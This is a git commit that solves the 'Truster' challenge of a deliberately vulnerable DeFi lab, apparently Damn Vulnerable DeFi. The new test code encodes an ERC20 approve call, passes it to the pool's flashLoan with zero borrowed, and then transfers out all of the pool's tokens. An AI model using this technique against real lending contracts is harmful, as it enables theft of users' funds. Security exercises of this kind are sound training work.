1f49d8ea68f374fd8eaa0fce0ec84665f60c817f
John Chang <johchng@amazon.com>
2021-10-10 18:55:37 +0100

    truster - approve amount by passing in abi encoded function call

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,44 +1,66 @@
-const { ether } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
+const { ether } = require("@openzeppelin/test-helpers");
+const { accounts, contract, web3 } = require("@openzeppelin/test-environment");
 
-const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
-const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
+const DamnValuableToken = contract.fromArtifact("DamnValuableToken");
+const TrusterLenderPool = contract.fromArtifact("TrusterLenderPool");
 
-const { expect } = require('chai');
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
+describe("[Challenge] Truster", function () {
+  const [deployer, attacker, ...otherAccounts] = accounts;
 
-    const [deployer, attacker, ...otherAccounts] = accounts;
+  const TOKENS_IN_POOL = ether("1000000");
 
-    const TOKENS_IN_POOL = ether('1000000');
-
-    before(async function () {
-        /** SETUP SCENARIO */
-        this.token = await DamnValuableToken.new({ from: deployer });
-        this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });
-
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
-
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);
-
-        expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal('0');
+  before(async function () {
+    /** SETUP SCENARIO */
+    this.token = await DamnValuableToken.new({ from: deployer });
+    this.pool = await TrusterLenderPool.new(this.token.address, {
+      from: deployer,
     });
 
-    it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL, {
+      from: deployer,
     });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-        expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal('0');
+    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
+      TOKENS_IN_POOL
+    );
+
+    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal("0");
+  });
+
+  it("Exploit", async function () {
+    let callData = web3.eth.abi.encodeFunctionCall(
+      {
+        name: "approve",
+        type: "function",
+        inputs: [
+          {
+            type: "address",
+            name: "spender",
+          },
+          {
+            type: "uint256",
+            name: "amount",
+          },
+        ],
+      },
+      [attacker, TOKENS_IN_POOL.toString()]
+    );
+
+    this.pool.flashLoan(0, attacker, this.token.address, callData);
+    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {
+      from: attacker,
     });
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
+      "0"
+    );
+  });
 });
